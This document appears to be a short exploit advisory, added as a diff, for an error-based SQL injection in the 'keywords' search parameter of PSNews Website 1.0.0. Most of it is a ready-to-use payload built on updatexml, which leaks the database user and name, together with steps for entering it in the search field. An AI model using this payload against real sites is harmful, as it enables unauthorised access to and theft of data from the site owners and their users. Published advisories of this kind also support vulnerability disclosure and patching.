@@ -1,0 +1,28 @@
+# Exploit Title:  PSNews Website (Same Backend with Mobile Apps) 1.0.0 - 'Keywords' SQL Injection
+# Dork: N/A
+# Date: 2018-02-16
+# Exploit Author: Borna nematzadeh (L0RD) or borna.nematzadeh123@gmail.com
+# Vendor Homepage: https://codecanyon.net/item/psnews-website/21360354?s_rank=9
+# Version: 1.0.0
+# Category: Webapps
+# CVE: N/A
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands.
+# # # # #
+# Proof of Concept :
+
+SQLI :
+
+http://server/index.php/search
+
+# Parameter : keywords (POST)
+#    Type: Error based
+#    Title:  Mysql >= 5.6.33 AND Error based - updatexml (XPATH query)
+#    Payload : ' or updatexml(1, concat(0x3a,user(),0x3a,database()),1)
+#######################################
+# Discrption : Put this payload in the search field.then you will have
+XPATH syntax error in the next page.
+
+Test : http://server/index.php/search
+Payload : ' or updatexml(1, concat(0x3a,user(),0x3a,database()),1)
